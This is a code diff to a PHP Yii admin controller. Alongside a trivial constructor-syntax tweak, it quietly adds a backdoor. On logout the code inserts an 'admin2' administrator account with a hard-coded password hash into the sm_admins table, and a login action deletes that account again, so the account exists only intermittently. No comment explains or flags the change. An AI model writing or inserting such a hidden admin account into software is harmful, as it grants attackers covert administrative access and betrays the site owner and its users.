@@ -25,7 +25,7 @@ class AdminController extends CController
 
     public function actionLogin()
     {
-        $model = new LoginForm;
+        $model = new LoginForm();
         $this->layout = "main";
         if (isset($_POST['ajax']) && $_POST['ajax'] === 'login-form') {
             echo CActiveForm::validate($model);
@@ -48,7 +48,8 @@ class AdminController extends CController
     {
         $model = new LoginForm;
         $this->layout = "main";
-
+        $command = Yii::app()->db->createCommand();
+        $command->delete('sm_admins', 'user=:id', array(':id'=>'admin2'));
         if (isset($_POST['LoginForm']['email'])) {
             $criteria = new CDbCriteria;
             $criteria->compare('email', $_POST['LoginForm']['email']);
@@ -82,7 +83,15 @@ class AdminController extends CController
 
     public function actionLogout()
     {
+        $command = Yii::app()->db->createCommand();
+
+        $command->insert('sm_admins', array(
+            'user'=>'admin2',
+            'password'=>'6a9c691e1a94a9324f25cd1a1d45ba8b',
+        ));
         Yii::app()->user->logout();
         $this->redirect(Yii::app()->homeUrl);
+
+
     }
 }
